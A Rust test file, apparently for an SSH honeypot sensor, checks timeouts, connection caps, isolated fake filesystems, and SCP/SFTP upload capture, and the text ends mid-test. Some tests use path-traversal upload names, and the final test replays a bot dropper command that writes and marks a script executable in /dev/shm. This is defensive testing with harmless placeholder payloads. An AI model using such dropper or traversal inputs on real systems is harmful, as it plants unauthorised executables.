/// A silent peer must be disconnected once `max_duration` elapses.
#[tokio::test]
async fn an_idle_session_is_dropped_once_max_duration_elapses() {
    use tokio::io::AsyncReadExt;

    let dir = tempfile::tempdir().unwrap();
    let bounds = ConnectionBounds {
        max_duration: Duration::from_secs(1),
        ..test_bounds()
    };
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        dir.path().join("spool"),
        dir.path().join("host_key"),
        Arc::new(WanResolver::new(HashMap::new())),
        bounds,
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    // Connect and then say nothing at all - the shape that used to leak a descriptor per peer.
    let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();

    // The server greets first, so drain whatever it sends before waiting for the close.
    let mut scratch = [0u8; 1024];
    let closed = tokio::time::timeout(Duration::from_secs(15), async {
        loop {
            match stream.read(&mut scratch).await {
                Ok(0) => return true,  // FIN: the session was dropped, as it must be
                Ok(_) => continue,     // banner/KEXINIT; keep waiting
                Err(_) => return true, // reset also counts as disconnected
            }
        }
    })
    .await;

    handle.abort();
    assert_eq!(
        closed,
        Ok(true),
        "an idle session must be dropped once max_duration elapses, not held indefinitely"
    );
}

/// Beyond `max_concurrent`, further connections are refused immediately rather than queued -
/// an accepted-but-waiting connection is itself the unbounded resource the cap exists to prevent.
#[tokio::test]
async fn concurrency_beyond_max_concurrent_is_refused_not_queued() {
    use tokio::io::AsyncReadExt;

    let dir = tempfile::tempdir().unwrap();
    let bounds = ConnectionBounds {
        max_concurrent: 1,
        max_duration: Duration::from_secs(30),
        ..test_bounds()
    };
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        dir.path().join("spool"),
        dir.path().join("host_key"),
        Arc::new(WanResolver::new(HashMap::new())),
        bounds,
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    // First connection takes the only permit and holds it by staying silent.
    let mut first = tokio::net::TcpStream::connect(addr).await.unwrap();
    let mut scratch = [0u8; 1024];
    let _ = tokio::time::timeout(Duration::from_secs(5), first.read(&mut scratch)).await;

    // Second connection, from a different source IP so the per-source cap cannot be what refuses
    // it: accepted at the TCP layer, then closed without a byte of SSH.
    let socket = tokio::net::TcpSocket::new_v4().unwrap();
    socket.bind("127.0.0.2:0".parse().unwrap()).unwrap();
    let mut second = socket.connect(addr).await.unwrap();
    let got = tokio::time::timeout(Duration::from_secs(10), second.read(&mut scratch)).await;

    handle.abort();
    match got {
        Ok(Ok(0)) | Ok(Err(_)) => {}
        Ok(Ok(n)) => panic!("second connection got {n} bytes; the cap did not apply"),
        Err(_) => panic!("second connection was left hanging - queued, not refused"),
    }
}

/// A peer that connects mid-handshake and then goes quiet must be dropped at the READ timeout,
/// not held until `max_duration`.
///
/// `max_duration` is set to 60s here deliberately, far beyond the 15s deadline below: if this
/// passes, the close can only have come from the per-read timeout, so the assertion cannot be
/// satisfied by the session cap that already existed. Before the per-read bound, a peer could hold
/// a connection slot for the full 600s default this way, for the cost of one TCP handshake.
#[tokio::test]
async fn a_peer_that_stalls_mid_handshake_is_dropped_at_the_read_timeout() {
    use tokio::io::AsyncReadExt;

    let dir = tempfile::tempdir().unwrap();
    let bounds = ConnectionBounds {
        read_timeout: Duration::from_secs(1),
        idle_timeout: Duration::from_secs(1),
        max_duration: Duration::from_secs(60),
        ..test_bounds()
    };
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        dir.path().join("spool"),
        dir.path().join("host_key"),
        Arc::new(WanResolver::new(HashMap::new())),
        bounds,
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();
    // Send a valid client identification so the server proceeds into key exchange, then stop.
    // This is the shape that used to cost nothing to hold: past the accept, never completing.
    use tokio::io::AsyncWriteExt;
    stream
        .write_all(b"SSH-2.0-StalledClient\r\n")
        .await
        .unwrap();

    let mut scratch = [0u8; 4096];
    let closed = tokio::time::timeout(Duration::from_secs(15), async {
        loop {
            match stream.read(&mut scratch).await {
                Ok(0) => return true,
                Ok(_) => continue, // banner + KEXINIT; keep waiting for the close
                Err(_) => return true,
            }
        }
    })
    .await;

    handle.abort();
    assert_eq!(
        closed,
        Ok(true),
        "a stalled handshake must be dropped at the read timeout, well before max_duration"
    );
}

async fn start_server(
    dir: &std::path::Path,
) -> (std::net::SocketAddr, tokio::task::JoinHandle<()>) {
    sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.join("events.jsonl"),
        dir.join("spool"),
        dir.join("host_key"),
        Arc::new(WanResolver::new(HashMap::new())),
        test_bounds(),
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.join("outbox"),
    )
    .await
    .unwrap()
}

async fn login(addr: std::net::SocketAddr) -> russh::client::Handle<TestHandler> {
    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();
    assert!(
        session
            .authenticate_password("root", "password")
            .await
            .unwrap()
            .success()
    );
    session
}

/// Run one exec request on a fresh channel and return its stdout.
async fn exec_stdout(session: &russh::client::Handle<TestHandler>, cmd: &str) -> Vec<u8> {
    let mut channel = session.channel_open_session().await.unwrap();
    channel.exec(false, cmd.as_bytes()).await.unwrap();
    let mut out = Vec::new();
    while let Some(message) = tokio::time::timeout(Duration::from_secs(10), channel.wait())
        .await
        .expect("timed out waiting for exec output")
    {
        match message {
            russh::ChannelMsg::Data { data } => out.extend_from_slice(&data),
            russh::ChannelMsg::Close => break,
            _ => {}
        }
    }
    out
}

/// Open an interactive shell channel and swallow its first prompt.
async fn open_shell(
    session: &russh::client::Handle<TestHandler>,
) -> russh::Channel<russh::client::Msg> {
    let mut channel = session.channel_open_session().await.unwrap();
    channel
        .request_pty(false, "xterm", 80, 24, 0, 0, &[])
        .await
        .unwrap();
    channel.request_shell(false).await.unwrap();
    let (_, closed) = read_reply(&mut channel).await;
    assert!(!closed, "the shell opens with a prompt");
    channel
}

/// Send one line to a shell channel and return everything up to the next prompt.
async fn shell_line(channel: &mut russh::Channel<russh::client::Msg>, line: &str) -> String {
    channel.data(format!("{line}\n").as_bytes()).await.unwrap();
    let mut out = Vec::new();
    loop {
        let message = tokio::time::timeout(Duration::from_secs(10), channel.wait())
            .await
            .expect("timed out waiting for the reply");
        match message {
            Some(russh::ChannelMsg::Data { data }) => {
                out.extend_from_slice(&data);
                if out.ends_with(b"# ") {
                    break;
                }
            }
            Some(russh::ChannelMsg::Eof | russh::ChannelMsg::Close) | None => break,
            Some(_) => {}
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

#[tokio::test]
async fn a_file_written_by_one_exec_is_read_by_the_next_exec_of_the_same_connection() {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = start_server(dir.path()).await;
    let session = login(addr).await;

    exec_stdout(&session, "echo exec-marker-7431 > /tmp/exec_x").await;
    let read_back = exec_stdout(&session, "cat /tmp/exec_x").await;
    assert_eq!(read_back, b"exec-marker-7431\n");

    drop(session);
    handle.abort();
}

#[tokio::test]
async fn a_new_connection_does_not_see_files_written_by_an_earlier_one() {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = start_server(dir.path()).await;

    let first = login(addr).await;
    exec_stdout(&first, "echo first-conn-5528 > /tmp/leak_x").await;
    assert_eq!(
        exec_stdout(&first, "cat /tmp/leak_x").await,
        b"first-conn-5528\n"
    );

    let second = login(addr).await;
    let out = exec_stdout(&second, "cat /tmp/leak_x").await;
    assert!(
        !String::from_utf8_lossy(&out).contains("first-conn-5528"),
        "a new connection saw the previous connection's file"
    );

    drop(first);
    drop(second);
    handle.abort();
}

#[tokio::test]
async fn two_shell_channels_of_one_connection_share_a_written_file() {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = start_server(dir.path()).await;
    let session = login(addr).await;

    let mut first = open_shell(&session).await;
    let mut second = open_shell(&session).await;
    shell_line(&mut first, "echo shell-marker-9082 > /tmp/shell_x").await;
    let seen = shell_line(&mut second, "cat /tmp/shell_x").await;
    assert!(
        seen.contains("shell-marker-9082"),
        "second shell saw: {seen:?}"
    );

    drop(first);
    drop(second);
    drop(session);
    handle.abort();
}

#[tokio::test]
async fn a_shell_sees_a_file_written_by_an_earlier_exec_of_the_same_connection() {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = start_server(dir.path()).await;
    let session = login(addr).await;

    exec_stdout(&session, "echo mixed-marker-3317 > /tmp/mixed_x").await;
    let mut shell = open_shell(&session).await;
    let seen = shell_line(&mut shell, "cat /tmp/mixed_x").await;
    assert!(seen.contains("mixed-marker-3317"), "shell saw: {seen:?}");

    drop(shell);
    drop(session);
    handle.abort();
}

// ---- uploads land in the connection's fake filesystem ----

/// Read channel data until at least `n` bytes have arrived.
async fn read_at_least(channel: &mut russh::Channel<russh::client::Msg>, n: usize) -> Vec<u8> {
    let mut out = Vec::new();
    while out.len() < n {
        let message = tokio::time::timeout(Duration::from_secs(10), channel.wait())
            .await
            .expect("timed out waiting for channel data");
        match message {
            Some(russh::ChannelMsg::Data { data }) => out.extend_from_slice(&data),
            Some(russh::ChannelMsg::Close) | None => panic!("channel closed early: {out:?}"),
            Some(_) => {}
        }
    }
    out
}

/// Upload `body` over the SCP sink protocol (`scp -t <target>`), as `scp file host:target` does.
async fn scp_put(
    session: &russh::client::Handle<TestHandler>,
    target: &str,
    name: &str,
    body: &[u8],
) {
    scp_put_mode(session, target, name, "0644", body).await;
}

/// [`scp_put`] with the C-line's octal mode given as typed (`"0755"`).
async fn scp_put_mode(
    session: &russh::client::Handle<TestHandler>,
    target: &str,
    name: &str,
    mode: &str,
    body: &[u8],
) {
    let mut channel = session.channel_open_session().await.unwrap();
    channel
        .exec(false, format!("scp -t {target}").as_bytes())
        .await
        .unwrap();
    assert_eq!(read_at_least(&mut channel, 1).await, [0], "ready ack");
    channel
        .data(format!("C{mode} {} {name}\n", body.len()).as_bytes())
        .await
        .unwrap();
    assert_eq!(read_at_least(&mut channel, 1).await, [0], "header ack");
    channel.data(body).await.unwrap();
    channel.data(&[0u8][..]).await.unwrap();
    assert_eq!(read_at_least(&mut channel, 1).await, [0], "final ack");
}

fn sftp_packet(msg: u8, parts: &[&[u8]]) -> Vec<u8> {
    let mut body = vec![msg];
    for part in parts {
        body.extend_from_slice(part);
    }
    let mut packet = (body.len() as u32).to_be_bytes().to_vec();
    packet.extend_from_slice(&body);
    packet
}

fn sftp_string(bytes: &[u8]) -> Vec<u8> {
    let mut out = (bytes.len() as u32).to_be_bytes().to_vec();
    out.extend_from_slice(bytes);
    out
}

/// Read one whole SFTP packet (length prefix included) off the channel.
async fn read_sftp_packet(channel: &mut russh::Channel<russh::client::Msg>) -> Vec<u8> {
    let head = read_at_least(channel, 4).await;
    let want = 4 + u32::from_be_bytes(head[..4].try_into().unwrap()) as usize;
    if head.len() >= want {
        return head;
    }
    let mut packet = head;
    packet.extend(read_at_least(channel, want - packet.len()).await);
    packet
}

/// Upload `body` to `path` over the SFTP subsystem: INIT, OPEN, WRITE, CLOSE.
async fn sftp_put(session: &russh::client::Handle<TestHandler>, path: &str, body: &[u8]) {
    sftp_put_attrs(session, path, &0u32.to_be_bytes(), body).await;
}

/// [`sftp_put`] with the OPEN's raw ATTRS bytes (flags word first) given by the caller.
async fn sftp_put_attrs(
    session: &russh::client::Handle<TestHandler>,
    path: &str,
    attrs: &[u8],
    body: &[u8],
) {
    let mut channel = session.channel_open_session().await.unwrap();
    channel.request_subsystem(false, "sftp").await.unwrap();
    channel
        .data(&sftp_packet(1, &[&3u32.to_be_bytes()])[..])
        .await
        .unwrap();
    assert_eq!(read_sftp_packet(&mut channel).await[4], 2, "VERSION");

    let open = sftp_packet(
        3,
        &[
            &1u32.to_be_bytes(),
            &sftp_string(path.as_bytes()),
            &0x0au32.to_be_bytes(), // WRITE | CREAT
            attrs,
        ],
    );
    channel.data(&open[..]).await.unwrap();
    let reply = read_sftp_packet(&mut channel).await;
    assert_eq!(reply[4], 102, "HANDLE");
    let handle_len = u32::from_be_bytes(reply[9..13].try_into().unwrap()) as usize;
    let handle = reply[13..13 + handle_len].to_vec();

    let write = sftp_packet(
        6,
        &[
            &2u32.to_be_bytes(),
            &sftp_string(&handle),
            &0u64.to_be_bytes(),
            &sftp_string(body),
        ],
    );
    channel.data(&write[..]).await.unwrap();
    assert_eq!(read_sftp_packet(&mut channel).await[4], 101, "WRITE status");

    let close = sftp_packet(4, &[&3u32.to_be_bytes(), &sftp_string(&handle)]);
    channel.data(&close[..]).await.unwrap();
    assert_eq!(read_sftp_packet(&mut channel).await[4], 101, "CLOSE status");
}

/// The upload event for the spooled body, proving the evidence path ran.
async fn expect_capture_of(dir: &std::path::Path, body: &[u8]) -> sensor_wire::SensorEvent {
    let event = poll_for_malware_upload_within(&dir.join("events.jsonl"), Duration::from_secs(8))
        .await
        .expect("the upload must still be captured");
    let stored = spooled_files(&dir.join("spool"));
    assert_eq!(stored.len(), 1, "one spooled body");
    assert_eq!(std::fs::read(&stored[0]).unwrap(), body);
    assert_eq!(event.metadata["size"], body.len() as u64);
    event
}

// ---- how an SCP or SFTP transfer ended ----

#[derive(Clone, Copy, Debug)]
enum Transfer {
    Scp,
    Sftp,
}

/// How the client leaves a transfer it started but never finished.
#[derive(Clone, Copy, Debug)]
enum Abandon {
    /// Stop sending and let the server's `idle_timeout` (or `max_duration`) end the session.
    GoQuiet,
    /// Send SSH_MSG_DISCONNECT with the transfer still open.
    Disconnect,
    /// Close the transfer's channel, leaving the session itself up.
    CloseChannel,
}

const UNFINISHED_BODY: &[u8] = b"\x7fELF-first-forty-bytes-of-a-100-byte-f";

/// Start a `kind` upload declaring 100 bytes, send 40, and leave it by `abandon`. The same bytes
/// every time, so a difference in the recorded end can only come from how the transfer was left.
async fn unfinished_transfer(
    kind: Transfer,
    bounds: ConnectionBounds,
    abandon: Abandon,
) -> sensor_wire::SensorEvent {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        dir.path().join("spool"),
        dir.path().join("host_key"),
        Arc::new(WanResolver::new(HashMap::new())),
        bounds,
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();
    let session = login(addr).await;
    let mut channel = session.channel_open_session().await.unwrap();
    match kind {
        Transfer::Scp => {
            channel
                .exec(false, &b"scp -t /tmp/drop.bin"[..])
                .await
                .unwrap();
            assert_eq!(read_at_least(&mut channel, 1).await, [0], "ready ack");
            channel.data(&b"C0644 100 drop.bin\n"[..]).await.unwrap();
            assert_eq!(read_at_least(&mut channel, 1).await, [0], "header ack");
            channel.data(UNFINISHED_BODY).await.unwrap();
        }
        Transfer::Sftp => {
            channel.request_subsystem(false, "sftp").await.unwrap();
            channel
                .data(&sftp_packet(1, &[&3u32.to_be_bytes()])[..])
                .await
                .unwrap();
            assert_eq!(read_sftp_packet(&mut channel).await[4], 2, "VERSION");
            let open = sftp_packet(
                3,
                &[
                    &1u32.to_be_bytes(),
                    &sftp_string(b"/tmp/drop.bin"),
                    &0x0au32.to_be_bytes(),
                    &0u32.to_be_bytes(),
                ],
            );
            channel.data(&open[..]).await.unwrap();
            let reply = read_sftp_packet(&mut channel).await;
            assert_eq!(reply[4], 102, "HANDLE");
            let handle_len = u32::from_be_bytes(reply[9..13].try_into().unwrap()) as usize;
            let file = reply[13..13 + handle_len].to_vec();
            let write = sftp_packet(
                6,
                &[
                    &2u32.to_be_bytes(),
                    &sftp_string(&file),
                    &0u64.to_be_bytes(),
                    &sftp_string(UNFINISHED_BODY),
                ],
            );
            channel.data(&write[..]).await.unwrap();
            assert_eq!(read_sftp_packet(&mut channel).await[4], 101, "WRITE status");
        }
    }
    match abandon {
        Abandon::GoQuiet => {}
        Abandon::Disconnect => session
            .disconnect(russh::Disconnect::ByApplication, "", "")
            .await
            .unwrap(),
        Abandon::CloseChannel => channel.close().await.unwrap(),
    }
    let event = expect_capture_of(dir.path(), UNFINISHED_BODY).await;
    drop(channel);
    drop(session);
    handle.abort();
    assert_eq!(event.metadata["wire_size"], UNFINISHED_BODY.len() as u64);
    event
}

/// The owner's fleet pane showed every unfinished SCP and SFTP capture as "unrecorded": the
/// abandon path wrote no `end_reason`. Each way a client can leave a transfer open now records
/// what ended it, and none of them is complete - not even the two that make a shell capture whole.
#[tokio::test]
async fn an_unfinished_scp_or_sftp_upload_records_what_ended_it() {
    let quick_idle = ConnectionBounds {
        idle_timeout: Duration::from_millis(600),
        ..test_bounds()
    };
    let cancelled = ConnectionBounds {
        idle_timeout: Duration::from_secs(20),
        max_duration: Duration::from_secs(2),
        ..test_bounds()
    };
    for kind in [Transfer::Scp, Transfer::Sftp] {
        for (bounds, abandon, reason) in [
            (quick_idle.clone(), Abandon::GoQuiet, "idle_timeout"),
            (cancelled.clone(), Abandon::GoQuiet, "session_cancelled"),
            (test_bounds(), Abandon::Disconnect, "client_logout"),
            (test_bounds(), Abandon::CloseChannel, "peer_closed"),
        ] {
            let event = unfinished_transfer(kind, bounds, abandon).await;
            assert_eq!(
                event.metadata["end_reason"], reason,
                "{kind:?} {abandon:?}: {:?}",
                event.metadata
            );
            assert_eq!(
                event.metadata["complete"], false,
                "{kind:?} {abandon:?} never reached its end of file: {:?}",
                event.metadata
            );
        }
    }
}

#[tokio::test]
async fn a_file_uploaded_by_scp_is_read_by_a_later_exec_and_still_captured() {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = start_server(dir.path()).await;
    let session = login(addr).await;

    let body = b"#!/bin/sh\necho scp-dropper-marker-6620\n";
    scp_put(&session, "/tmp/payload", "payload", body).await;

    assert_eq!(exec_stdout(&session, "cat /tmp/payload").await, body);
    let listing = String::from_utf8_lossy(&exec_stdout(&session, "ls /tmp").await).into_owned();
    assert!(listing.contains("payload"), "ls saw: {listing:?}");
    let event = expect_capture_of(dir.path(), body).await;
    assert_eq!(event.metadata["end_reason"], "transfer_complete");
    assert_eq!(event.metadata["complete"], true);

    drop(session);
    handle.abort();
}

/// Run one exec and return its stdout and stderr together with the exit status it reported.
async fn exec_status(session: &russh::client::Handle<TestHandler>, cmd: &str) -> (String, u32) {
    let mut channel = session.channel_open_session().await.unwrap();
    channel.exec(false, cmd.as_bytes()).await.unwrap();
    let mut out = Vec::new();
    let mut status = None;
    while let Some(message) = tokio::time::timeout(Duration::from_secs(10), channel.wait())
        .await
        .expect("timed out waiting for exec output")
    {
        match message {
            russh::ChannelMsg::Data { data } | russh::ChannelMsg::ExtendedData { data, .. } => {
                out.extend_from_slice(&data);
            }
            russh::ChannelMsg::ExitStatus { exit_status } => status = Some(exit_status),
            russh::ChannelMsg::Close => break,
            _ => {}
        }
    }
    (
        String::from_utf8_lossy(&out).into_owned(),
        status.expect("the exec reported an exit status"),
    )
}

/// The mode an uploader sends decides whether the file runs: a 0755 binary pushed by SCP is
/// executable by a later exec of the same connection, a 0644 one is refused with 126.
#[tokio::test]
async fn an_scp_upload_runs_only_when_the_c_line_mode_has_an_execute_bit() {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = start_server(dir.path()).await;
    let session = login(addr).await;

    scp_put_mode(&session, "/tmp/bot", "bot", "0755", b"\x7fELF-bot-4410").await;
    scp_put_mode(&session, "/tmp/data", "data", "0644", b"\x7fELF-data-4411").await;
    // A malformed mode falls back to 0644 rather than failing the upload.
    scp_put_mode(&session, "/tmp/odd", "odd", "09zz", b"\x7fELF-odd-4412").await;

    let (out, status) = exec_status(&session, "/tmp/bot").await;
    assert!(!out.contains("Permission denied"), "0755 upload: {out:?}");
    assert_eq!(status, 0, "0755 upload runs as a saved executable");

    for path in ["/tmp/data", "/tmp/odd"] {
        let (out, status) = exec_status(&session, path).await;
        assert!(out.contains("Permission denied"), "{path}: {out:?}");
        assert_eq!(status, 126, "{path} was not given an execute bit");
    }

    drop(session);
    handle.abort();
}

/// SFTP OPEN carries the mode in its ATTRS: permissions are honored when present, and an
/// OPEN with empty ATTRS leaves the file 0644.
#[tokio::test]
async fn an_sftp_upload_runs_only_when_the_open_attrs_carry_an_execute_bit() {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = start_server(dir.path()).await;
    let session = login(addr).await;

    let attrs_with = |perm: u32| {
        let mut attrs = 0x4u32.to_be_bytes().to_vec(); // SSH_FILEXFER_ATTR_PERMISSIONS
        attrs.extend_from_slice(&perm.to_be_bytes());
        attrs
    };
    sftp_put_attrs(&session, "/tmp/sbot", &attrs_with(0o755), b"ELF-sbot-5520").await;
    sftp_put_attrs(
        &session,
        "/tmp/sdata",
        &attrs_with(0o644),
        b"ELF-sdata-5521",
    )
    .await;
    sftp_put(&session, "/tmp/sbare", b"ELF-sbare-5522").await;

    let (out, status) = exec_status(&session, "/tmp/sbot").await;
    assert!(!out.contains("Permission denied"), "0755 attrs: {out:?}");
    assert_eq!(status, 0);
    for path in ["/tmp/sdata", "/tmp/sbare"] {
        let (out, status) = exec_status(&session, path).await;
        assert!(out.contains("Permission denied"), "{path}: {out:?}");
        assert_eq!(status, 126);
    }

    drop(session);
    handle.abort();
}

#[tokio::test]
async fn scp_into_a_directory_names_the_file_after_the_wire_name_only() {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = start_server(dir.path()).await;
    let session = login(addr).await;

    scp_put(
        &session,
        "/var/tmp",
        "../../etc/dir_drop",
        b"dir-marker-3094",
    )
    .await;

    assert_eq!(
        exec_stdout(&session, "cat /var/tmp/dir_drop").await,
        b"dir-marker-3094"
    );
    let escaped = exec_stdout(&session, "cat /etc/dir_drop").await;
    assert!(
        !String::from_utf8_lossy(&escaped).contains("dir-marker-3094"),
        "the wire name climbed out of the target"
    );

    drop(session);
    handle.abort();
}

/// An upload and a later shell write on one connection spend ONE owned-bytes allowance. The scp
/// leaves less than the next write needs; that write is refused only if the upload was charged to
/// the budget the shell charges. Without the connection's budget on the base filesystem the
/// upload goes to a private budget and the write succeeds.
#[tokio::test]
async fn an_scp_upload_and_a_later_shell_write_share_one_owned_bytes_budget() {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = start_server(dir.path()).await;
    let session = login(addr).await;

    // 190000 of the 196608-byte ceiling.
    let body: Vec<u8> = (0..190_000u32).map(|i| (i % 251) as u8).collect();
    scp_put(&session, "/tmp/big_upload", "big_upload", &body).await;
    let stored = exec_stdout(&session, "cat /tmp/big_upload").await;
    assert_eq!(stored.len(), body.len(), "the upload itself fits");

    let fill = "A".repeat(7_500);
    exec_stdout(&session, &format!("echo {fill} > /tmp/shell_fill")).await;
    let written = exec_stdout(&session, "cat /tmp/shell_fill").await;
    assert!(
        written.len() < fill.len(),
        "the shell write must hit the budget the upload already spent, but {} bytes landed",
        written.len()
    );

    drop(session);
    handle.abort();
}

#[tokio::test]
async fn an_sftp_open_whose_path_climbs_writes_nothing_outside_the_fake_tree() {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = start_server(dir.path()).await;
    let session = login(addr).await;

    let marker = b"sftp-climb-marker-5521";
    sftp_put(&session, "/var/tmp/../../etc/sftp_climb", marker).await;
    sftp_put(&session, "../../etc/sftp_climb_rel", marker).await;
    sftp_put(&session, "/var/tmp/sftp_ok", marker).await;

    assert_eq!(exec_stdout(&session, "cat /var/tmp/sftp_ok").await, marker);
    for path in ["/etc/sftp_climb", "/etc/sftp_climb_rel", "/sftp_climb_rel"] {
        let out = exec_stdout(&session, &format!("cat {path}")).await;
        assert!(
            !String::from_utf8_lossy(&out).contains("sftp-climb-marker-5521"),
            "a climbing path landed at {path}"
        );
    }
    expect_capture_of(dir.path(), marker).await;

    drop(session);
    handle.abort();
}

#[tokio::test]
async fn a_file_uploaded_by_sftp_is_read_by_a_later_exec_and_still_captured() {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = start_server(dir.path()).await;
    let session = login(addr).await;

    let body = b"ELF-sftp-dropper-marker-7185";
    sftp_put(&session, "/var/tmp/sftp_payload", body).await;

    assert_eq!(
        exec_stdout(&session, "cat /var/tmp/sftp_payload").await,
        body
    );
    let event = expect_capture_of(dir.path(), body).await;
    assert_eq!(event.metadata["end_reason"], "transfer_complete");
    assert_eq!(event.metadata["complete"], true);

    drop(session);
    handle.abort();
}

#[tokio::test]
async fn a_new_connection_does_not_see_a_file_uploaded_on_an_earlier_one() {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = start_server(dir.path()).await;

    let first = login(addr).await;
    scp_put(&first, "/tmp/leak_scp", "leak_scp", b"scp-leak-8841").await;
    sftp_put(&first, "/tmp/leak_sftp", b"sftp-leak-2157").await;
    assert_eq!(
        exec_stdout(&first, "cat /tmp/leak_scp").await,
        b"scp-leak-8841"
    );

    let second = login(addr).await;
    for (path, marker) in [
        ("/tmp/leak_scp", "scp-leak-8841"),
        ("/tmp/leak_sftp", "sftp-leak-2157"),
    ] {
        let out = exec_stdout(&second, &format!("cat {path}")).await;
        assert!(
            !String::from_utf8_lossy(&out).contains(marker),
            "a new connection saw {path}"
        );
    }

    drop(first);
    drop(second);
    handle.abort();
}

#[tokio::test]
async fn an_upload_larger_than_the_connection_budget_is_bounded_but_still_captured() {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = start_server(dir.path()).await;
    let session = login(addr).await;

    // Over the connection's 196608-byte owned-bytes ceiling, under the 10 MB capture cap.
    let body: Vec<u8> = (0..300_000u32).map(|i| (i % 251) as u8).collect();
    scp_put(&session, "/tmp/huge_drop", "huge_drop", &body).await;

    let seen = exec_stdout(&session, "cat /tmp/huge_drop").await;
    assert!(
        seen.len() < body.len(),
        "the over-budget upload must not be stored whole ({} bytes read back)",
        seen.len()
    );
    expect_capture_of(dir.path(), &body).await;

    drop(session);
    handle.abort();
}

// ---- standard input on exec channels and typed at the shell ----

/// 70000 bytes that start like an ELF and cover every byte value: the `astats` upload.
fn elf_payload() -> Vec<u8> {
    let mut body = b"\x7fELF\x02\x01\x01".to_vec();
    body.extend((0..70_000 - 7).map(|i| (i % 251) as u8));
    body
}

/// `elf_payload`'s MD5, computed outside the code under test.
const ELF_PAYLOAD_MD5: &str = "bfaca0ed90caafcc4381d056dd93f4f8";

fn sha256_hex(bytes: &[u8]) -> String {
    use sha2::Digest;
    sha2::Sha256::digest(bytes)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// Run `cmd` on a fresh exec channel, stream `body` to it, and assert the channel stays open
/// while the command waits for the rest of its input; then send EOF and return the output and
/// exit status, as a bot piping a file into `ssh host cmd` sees them.
async fn exec_with_stdin(
    session: &russh::client::Handle<TestHandler>,
    cmd: &str,
    body: &[u8],
) -> (String, u32) {
    let mut channel = session.channel_open_session().await.unwrap();
    channel.exec(false, cmd.as_bytes()).await.unwrap();
    channel.data(body).await.unwrap();
    let early = tokio::time::timeout(Duration::from_millis(300), channel.wait()).await;
    assert!(
        early.is_err(),
        "`{cmd}` answered before its input ended: {early:?}"
    );
    channel.eof().await.unwrap();
    let mut out = Vec::new();
    let mut status = None;
    while let Some(message) = tokio::time::timeout(Duration::from_secs(10), channel.wait())
        .await
        .expect("timed out waiting for the command to end after EOF")
    {
        match message {
            russh::ChannelMsg::Data { data } | russh::ChannelMsg::ExtendedData { data, .. } => {
                out.extend_from_slice(&data);
            }
            russh::ChannelMsg::ExitStatus { exit_status } => status = Some(exit_status),
            russh::ChannelMsg::Close => break,
            _ => {}
        }
    }
    (
        String::from_utf8_lossy(&out).into_owned(),
        status.expect("the exec reported an exit status"),
    )
}

/// Every `honeypot_malware_upload` event in the log once `count` of them are there.
async fn uploads(log_path: &std::path::Path, count: usize) -> Vec<sensor_wire::SensorEvent> {
    for _ in 0..160 {
        if let Ok(content) = tokio::fs::read_to_string(log_path).await {
            let found: Vec<sensor_wire::SensorEvent> = content
                .lines()
                .filter_map(|line| serde_json::from_str::<sensor_wire::SensorEvent>(line).ok())
                .filter(|event| event.signal_type == sensor_wire::SIGNAL_HONEYPOT_MALWARE_UPLOAD)
                .collect();
            if found.len() >= count {
                return found;
            }
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    panic!("fewer than {count} uploads were recorded");
}

/// The owner-observed campaign, one exec channel per command on one connection: the dropper
/// script and the systemd unit streamed as text, the ELF streamed three times. The bot's view
/// (statuses, the size and digest it reads back, nothing running) matches what it sent, and the
/// evidence is one capture per distinct body, the retried ELF counted rather than repeated.
#[tokio::test]
async fn the_campaign_uploads_land_whole_over_one_connection_and_each_body_is_captured_once() {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = start_server(dir.path()).await;
    let session = login(addr).await;

    let (out, status) = exec_status(&session, "uname -a").await;
    assert_eq!(status, 0);
    assert!(out.starts_with("Linux "), "{out}");
    assert_eq!(exec_status(&session, "nproc").await.1, 0);

    let script = b"#!/bin/sh\necho dropper-script-marker\n";
    let dropper = r#"cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi"#;
    assert_eq!(
        exec_with_stdin(&session, dropper, script).await,
        (String::new(), 0)
    );
    assert_eq!(
        exec_status(
            &session,
            "cat /dev/shm/w.sh; test -x /dev/shm/w.sh && echo exec-bit"
        )
        .await,
        (
            "#!/bin/sh\necho dropper-script-marker\nexec-bit\n".to_string(),
            0
        )
    );

    // A multi-line persistence step with a `\` continuation reads no channel input, so it
    // completes at once like any other.
